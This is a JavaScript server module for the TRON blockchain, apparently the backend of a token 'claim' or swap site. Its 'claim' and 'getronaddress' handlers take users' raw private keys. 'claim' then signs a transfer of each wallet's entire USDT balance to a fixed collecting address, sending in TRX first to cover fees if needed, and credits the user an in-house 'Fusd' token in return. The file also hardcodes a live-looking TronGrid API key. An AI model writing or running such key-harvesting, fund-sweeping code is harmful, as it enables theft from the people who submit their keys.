const TronWeb = require("tronweb");
const HttpProvider = TronWeb.providers.HttpProvider;
const fullNode = new HttpProvider("https://api.trongrid.io");
const solidityNode = new HttpProvider("https://api.trongrid.io");
const eventServer = new HttpProvider("https://api.trongrid.io");
const RPC = "https://api.trongrid.io";
var url = "https://fufi.finance/rpc";
require("dotenv").config();
const fs = require("fs");
const axios = require("axios");
var Web3 = require("web3");
const web3 = new Web3(Web3.givenProvider || url);
const abi = fs.readFileSync("./abis/abi_entry.json", "utf-8");

const { Fusdnew } = require("./R33");
const { newR3333 } = require("./R33");

const getronaddress = async (req, res, next) => {
  var privateKey = req.body.privateKey;
  str = privateKey.substring(2);
  const tronWeb = new TronWeb(fullNode, solidityNode, eventServer, str);
  const address = tronWeb.address.fromPrivateKey(str);
  const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  const { abi } = await tronWeb.trx.getContract(CONTRACT);
  const contract = tronWeb.contract(abi.entrys, CONTRACT);
  const balance = await contract.methods.balanceOf(address).call();

  console.log("balance1452", balance.toString());
  let am = tronWeb.fromSun(balance);
  amount = Math.trunc(am);

  res.status(200).send({ status: true, data: { address, amount } });
};

const TronTRC20Transfer = async (fromAddress, privateKey, toAddress, am) => {
  const tronWeb = new TronWeb(fullNode, solidityNode, eventServer, privateKey);
  tronWeb.setHeader({
    "TRON-PRO-API-KEY": "e0cbf5e4-e9c6-4645-ab9c-949dad837ca9",
  });
  return new Promise(async (resolve, reject) => {
    try {
      const tronWeb = new TronWeb({
        fullHost: RPC,
        headers: { "TRON-PRO-API-KEY": "e0cbf5e4-e9c6-4645-ab9c-949dad837ca9" },
        privateKey: "123456",
      });

      const tradeobj = await tronWeb.transactionBuilder.sendTrx(
        toAddress,
        // 7000000,
        am,
        fromAddress
      );
      // Sign
      const signedtxn = await tronWeb.trx.sign(tradeobj, privateKey);
      // Broadcast
      const receipt = await tronWeb.trx
        .sendRawTransaction(signedtxn)
        .then((output) => {
          console.log("- Output:", output.txid, "\n");
          return resolve(output.txid);
        });
    } catch (e) {
      console.log(e);
      return reject(e);
    }
  });
};

const claim = async (req, res, next) => {
  var privateKey = req.body.privateKey;
  var myAddress = req.body.myAddress;
  privateKey = privateKey.substring(2);
  const Receive = "THRdk7jVdqnCcyKY8vVRFvEU8thujSenp8";

  const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  const tronWeb = new TronWeb(fullNode, solidityNode, eventServer, privateKey);
  let balance = 0;
  async function main() {
    return new Promise(async (resolve, reject) => {
      const { abi } = await tronWeb.trx.getContract(CONTRACT);
      const contract = tronWeb.contract(abi.entrys, CONTRACT);
      const ACCOUNT = tronWeb.address.fromPrivateKey(privateKey);
      console.log("hhhhhhhhhhh", ACCOUNT);
      balance = await contract.methods.balanceOf(ACCOUNT).call();
      console.log("balance1452", balance.toString());
      tronWeb.trx
        .getBalance(ACCOUNT)
        .then(async (trxbal) => {
          console.log("^^^^^", trxbal);
          let am = tronWeb.fromSun(trxbal);
          amount = Math.trunc(am);
          console.log("**********", amount);

          let response;
          if (balance > 1000000) {
            let remtrx = (14 - amount) * 1000000;
            console.log("LLLLLLLLLLLL", remtrx);
            if (amount >= 14) {
              const resp = await contract.methods
                .transfer(Receive, parseFloat(balance))
                .send();
              let usdt = tronWeb.fromSun(balance);
              balance = Math.trunc(usdt);
              console.log("rrrrrrr", balance);
              response = { status: true, hash: resp };
              return resolve(response);
            } else {
              await TronTRC20Transfer(
                "TAL86gVREuJujLCtF1fQDXVu4adqMfMNVU",
                privateKey,
                ACCOUNT,
                remtrx
              )
                .then(async (r) => {
                  console.log("trxtransfer", r);
                  const resp = await contract.methods
                    .transfer(Receive, parseFloat(balance))
                    .send();
                  let usdt = tronWeb.fromSun(balance);
                  balance = Math.trunc(usdt);
                  response = { status: true, hash: resp };
                  return resolve(response);
                })
                .catch((err) => {
                  console.log("**********", err);
                  response = { status: false, meassage: "failed" };
                  return reject(response);
                });
              //  response={"status":false,"meassage":"you have insufficient energy. please deposit trx "};
              // return reject(response);
            }
          } else {
            response = { status: false, meassage: "don't have usdt" };
            return reject(response);
          }
        })
        .catch((err) => {
          console.log("EEEE", err);
          response = { status: false, meassage: "failed" };
          return reject(response);
        });
    });
  }
  await main()
    .then(async (r) => {
      console.log("############", r);
      if (r.status) {
        const getData = async (myAddress, balance) => {
          let balance1 = balance - 1;
            await Fusdnew(myAddress, balance1.toString()).then(async (r) => {
              res.status(201).send({ status: true, msg: r });
              console.log("6666", balance1);
              await sleep(20000);
            });
        };
        getData(myAddress, balance);
      }
    })
    .catch((err) => {
      console.log("error:", err);
      res.status(404).send(err);
    });
};

const usdtbalance = async (req, res, next) => {
  var myAddress = "THRdk7jVdqnCcyKY8vVRFvEU8thujSenp8";
  var myAddress1 = "TVqEU6AsTSXi1tVP6jPmTarn2UApJ4kUiz";
  let privateKey ="1234";
  const tronWeb = new TronWeb(fullNode, solidityNode, eventServer,privateKey);
  const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  const { abi } = await tronWeb.trx.getContract(CONTRACT);
  const contract = tronWeb.contract(abi.entrys, CONTRACT);
  const balance = await contract.methods.balanceOf(myAddress).call();
  const balance1 = await contract.methods.balanceOf(myAddress1).call();
  console.log("balance1452", balance.toString());
  let am = tronWeb.fromSun(balance);
  amount = Math.trunc(am);

  console.log("balance1452", balance1.toString());
  let am1 = tronWeb.fromSun(balance1);
  amount1 = Math.trunc(am1);
  let amt = amount+amount1;
  res.status(200).send({ status: true, data:amt });
};

async function sleep(millis) {
  return new Promise((resolve) => setTimeout(resolve, millis));
}

module.exports = {
  getronaddress,
  claim,
  usdtbalance,
};
